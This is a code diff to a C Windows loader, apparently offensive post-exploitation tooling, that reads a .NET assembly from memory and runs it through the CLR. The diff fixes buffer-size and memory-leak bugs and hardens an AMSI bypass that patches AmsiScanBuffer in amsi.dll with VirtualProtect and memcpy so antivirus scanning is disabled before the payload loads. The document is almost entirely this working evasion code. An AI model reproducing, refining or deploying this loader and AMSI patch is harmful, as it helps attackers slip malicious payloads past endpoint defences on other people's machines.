@@ -67,11 +67,11 @@ int executeSharp(LPVOID lpPayload)
 	long raw_assembly_length = assemblysize.intvalue;
 	long raw_args_length = argssize.intvalue;
 
-	unsigned char *allData = (unsigned char*)malloc(raw_assembly_length * sizeof(unsigned char)+ raw_args_length * sizeof(unsigned char) + 8 * sizeof(unsigned char));
+	unsigned char *allData = (unsigned char*)malloc(raw_assembly_length * sizeof(unsigned char)+ raw_args_length * sizeof(unsigned char) + 9 * sizeof(unsigned char));
 	unsigned char *arg_s = (unsigned char*)malloc(raw_args_length * sizeof(unsigned char));
 	unsigned char *rawData = (unsigned char*)malloc(raw_assembly_length * sizeof(unsigned char));
 
-	SecureZeroMemory(allData, raw_assembly_length * sizeof(unsigned char) + raw_args_length * sizeof(unsigned char) + 8 * sizeof(unsigned char));
+	SecureZeroMemory(allData, raw_assembly_length * sizeof(unsigned char) + raw_args_length * sizeof(unsigned char) + 9 * sizeof(unsigned char));
 	SecureZeroMemory(arg_s, raw_args_length * sizeof(unsigned char));
 	SecureZeroMemory(rawData, raw_assembly_length * sizeof(unsigned char));
 
@@ -89,7 +89,7 @@ int executeSharp(LPVOID lpPayload)
 	}
 	
 	//Reading memory parameters + amsiflag + args + assembly
-	ReadProcessMemory(GetCurrentProcess(), lpPayload , allData, raw_assembly_length + raw_args_length + 8, &readed);
+	ReadProcessMemory(GetCurrentProcess(), lpPayload , allData, raw_assembly_length + raw_args_length + 9, &readed);
 
 	//Taking pointer to amsi
 	unsigned char *offsetamsi = allData + 8;
@@ -204,7 +204,11 @@ int executeSharp(LPVOID lpPayload)
 	//Amsi bypass
 	if (amsiflag[0] == '\x01')
 	{
-		BypassAmsi();
+		if(!BypassAmsi())
+		{
+			printf("Amsi bypass failed\n");
+			return -1;
+		}
 	}
 
 	hr = pDefaultAppDomain->Load_3(pSafeArray, &pAssembly);
@@ -237,11 +241,12 @@ int executeSharp(LPVOID lpPayload)
 
 		LPWSTR *szArglist;
 		int nArgs;
-		wchar_t *wtext;
-		wtext = (wchar_t *)malloc((sizeof(wchar_t) * raw_args_length +1));
+		wchar_t *wtext = (wchar_t *)malloc((sizeof(wchar_t) * raw_args_length +1));
 
-		mbstowcs(wtext, (char *)arg_s, strlen((char *)arg_s) + 1);
+		mbstowcs(wtext, (char *)arg_s, raw_args_length + 1);
 		szArglist = CommandLineToArgvW(wtext, &nArgs);
+
+		free(wtext);
 
 		vtPsa.parray = SafeArrayCreateVector(VT_BSTR, 0, nArgs);
 
@@ -312,7 +317,7 @@ BOOL FindVersion(void * assembly, int length)
 			}
 			else
 			{
-				if (j == (10 - 1))
+				if (j == (9))
 				{
 					return TRUE;
 				}
@@ -325,27 +330,32 @@ BOOL FindVersion(void * assembly, int length)
 
 BOOL BypassAmsi()
 {
-	PatchAmsi();
-	return TRUE;
+	return PatchAmsi();
 }
 
-VOID PatchAmsi()
+BOOL PatchAmsi()
 {
 
 	HMODULE lib = LoadLibraryA("amsi.dll");
+	if (lib == NULL)
+		return false;
+
 	LPVOID addr = GetProcAddress(lib, "AmsiScanBuffer");
+	if(addr == NULL)
+		return false;
 
 	DWORD oldProtect;
-	VirtualProtect(addr, patchsize, 0x40, &oldProtect);
+
+	if (!VirtualProtect(addr, patchsize, 0x40, &oldProtect))
+		return false;
 
 	memcpy(addr, amsipatch, patchsize);
 
-    if(!VirtualProtect(addr, patchsize, 0x40, &oldProtect){
-      return false;
-    }
-    memcpy(addr, amsipatch, patchsize);
-    return VirtualProtect(addr, patchsize, oldProtect, &oldProtect);
-	
+	if(!VirtualProtect(addr, patchsize, oldProtect, &oldProtect))
+		return false;
+
+	return true;
+
 }
 
 BOOL ClrIsLoaded(LPCWSTR version, IEnumUnknown* pEnumerator, LPVOID * pRuntimeInfo) {
@@ -370,6 +380,7 @@ BOOL ClrIsLoaded(LPCWSTR version, IEnumUnknown* pEnumerator, LPVOID * pRuntimeIn
 
 	return retval;
 }
+
 
 
 
